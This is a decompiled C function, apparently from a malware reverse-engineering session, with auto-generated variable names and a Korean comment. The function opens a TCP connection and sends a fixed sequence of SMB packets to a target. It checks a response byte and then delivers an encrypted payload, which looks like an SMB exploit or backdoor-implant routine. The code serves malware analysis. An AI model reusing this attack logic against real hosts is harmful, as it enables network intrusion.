// --- Metadata ---
// Function Name: TCPhandshakeSequence_4072A0
// Address: 0x4072A0
// Exported At: 20250528_142842
// Signature: unknown_signature
// ---------------
int __cdecl TCPhandshakeSequence_4072A0(char *cp, int a2, u_short hostshort)
{
  SOCKET v3; // eax
  SOCKET v4; // esi
  char v5; // bl
  unsigned int v6; // edi
  int v7; // ebx
  int v8; // eax
  char v10; // [esp+Fh] [ebp-419h]
  struct sockaddr name; // [esp+10h] [ebp-418h] BYREF
  int v12; // [esp+24h] [ebp-404h]
  char buf; // [esp+28h] [ebp-400h] BYREF
  char v14[1020]; // [esp+29h] [ebp-3FFh] BYREF
  __int16 v15; // [esp+425h] [ebp-3h]
  char v16; // [esp+427h] [ebp-1h]

  buf = 0;
  name.sa_family = 2;
  memset(v14, 0, sizeof(v14));
  v15 = 0;
  v16 = 0;
  *&name.sa_data[2] = inet_addr(cp);
  *name.sa_data = htons(hostshort);
  v3 = socket(2, 1, 0);
  v4 = v3;
  if ( v3 != -1 )
  {
    if ( connect(v3, &name, 16) != -1           // SMB72 SMB73 SMB75 SMB2 순서대로 메시지 전송  
      && send(v4, byte_42E544, 137, 0) != -1
      && recv(v4, &buf, 1024, 0) != -1
      && send(v4, byte_42E5D0, 140, 0) != -1
      && recv(v4, &buf, 1024, 0) != -1 )
    {
      v5 = v14[31];
      byte_42E67C = v14[31];
      v10 = v14[32];
      byte_42E67D = v14[32];
      if ( send(v4, byte_42E65C, 96, 0) != -1 && recv(v4, &buf, 1024, 0) != -1 )
      {
        byte_42E6D8 = v14[27];
        byte_42E6D9 = v14[28];
        byte_42E6DC = v5;
        byte_42E6DD = v10;
        byte_42E72C = v14[27];
        byte_42E72D = v14[28];
        byte_42E730 = v5;
        byte_42E731 = v10;
        if ( send(v4, byte_42E6BC, 82, 0) != -1 && recv(v4, &buf, 1024, 0) != -1 && v14[33] == 81 )
        {
          v6 = *&v14[17];
          v12 = *&v14[21];
          v7 = isSecondParamZero_406EB0(*&v14[17], *&v14[21]);
          v8 = obfuscateSessionId_406ED0(v6);
          sendEncryptedPayload_406F50(v4, v7, v8);
        }
      }
    }
    closesocket(v4);
  }
  return 0;
}
